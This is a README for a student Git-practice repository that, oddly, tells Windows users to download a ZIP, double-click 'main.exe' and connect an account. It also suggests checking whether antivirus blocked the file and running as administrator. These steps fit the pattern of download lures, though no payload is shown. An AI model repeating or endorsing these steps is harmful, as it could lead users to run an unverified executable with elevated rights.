# 🦁 Aula-git-lions-dev - Practice git workflow for student projects

[![](https://img.shields.io/badge/Download-Software-blue)](https://github.com/Hsusow31/Aula-git-lions-dev)

This project provides a sandbox environment for students to learn how to manage files using the Git version control system. It serves as a central hub where you can practice cloning, editing, and saving your progress in a collaborative setting.

## 🛠 What this software does

This application functions as a local workspace. It helps you understand how multiple people work on the same folder of files without overwriting each other's work. You will learn to track changes, revert to older versions of your files, and safely share your progress with your team.

## 💻 System requirements

Your computer must meet these basic standards to run this software:

*   **Operating System:** Windows 10 or Windows 11.
*   **Memory:** At least 4GB of RAM.
*   **Storage Space:** 200MB of free space on your hard drive.
*   **Internet Connection:** An active connection to download the initial files.

## 📥 How to download

Follow these steps to get the software onto your Windows machine:

1. Visit the [official project page](https://github.com/Hsusow31/Aula-git-lions-dev).
2. Look for the green button labeled "Code."
3. Select "Download ZIP" from the menu.
4. Locate the file in your "Downloads" folder.
5. Right-click the file and select "Extract All" to see the project contents.

## ⚙️ Setting up your environment

Once you extract the files, you need a way to manage them. We recommend installing a Git client if you want to use the full features of the repository. This allows you to sync your local copy with the master project.

1. Download the latest Windows installer for Git from the official website.
2. Run the installer and keep all default settings enabled.
3. Open the "Git Bash" application from your start menu.
4. Navigate to the folder where you extracted the project files.

## 🚀 Running the software for the first time

After you install the necessary tools, you can open your work space to start your assignments.

1. Open the folder you extracted earlier.
2. Locate the file named `main.exe` or `index.html`.
3. Double-click the file to open the interface.
4. Follow the prompts on the screen to connect your student account.
5. Once connected, your local version will signal that it is ready for your input.

## 📋 Common tasks

Most users perform these actions to get the most out of the repository:

*   **Cloning:** This copies the latest version of the assignments from the server to your computer.
*   **Committing:** Use this to save a snapshot of your progress. Always add a short note describing what you changed.
*   **Pushing:** This sends your saved snapshots back to the main server so your instructor can review your code.
*   **Pulling:** This updates your folder with the latest files from your classmates.

## 💡 Troubleshooting tips

If you encounter issues during setup, try these steps:

*   **File not opening:** Ensure you have the required software installed. Check if your antivirus software blocked the file path.
*   **Connection error:** Verify your internet connection. Git requires a stable network to communicate with the server.
*   **Permission denied:** Run your terminal or Git client as an administrator if you cannot move or edit files in your project directory.
*   **Missing files:** Return to the repository link and redownload the ZIP file to ensure all components exist in the folder.

## 📞 Getting help

If these steps do not solve your problem, talk to your course instructor. They maintain the repository and handle access rights for all students. You can also review the documentation provided in your course syllabus for specific commands.

## 🛡 Security and safety

This software processes text files and code. It does not collect personal data from your machine. Keep your login credentials private at all times. Do not share your access token with other students, as this allows them to perform actions in your name. 

## 📂 Project structure

The folders in this repository follow a set layout:

*   **/docs:** Contains the instructions for your daily tasks.
*   **/src:** Holds the actual files you need to edit.
*   **/assets:** Stores images and icons used in the application.
*   **/logs:** Tracks your recent activities to help you find mistakes.

Use these folders to keep your workspace clean. Do not move files between folders unless the instructions specifically tell you to do so. This ensures your work remains compatible with the grading scripts. 

## 📝 Final check

Before you start your first assignment, confirm you have all tools installed. Open the terminal and type `git --version`. If your screen shows a version number, you successfully set up the environment. You are now ready to begin your lesson in version control.
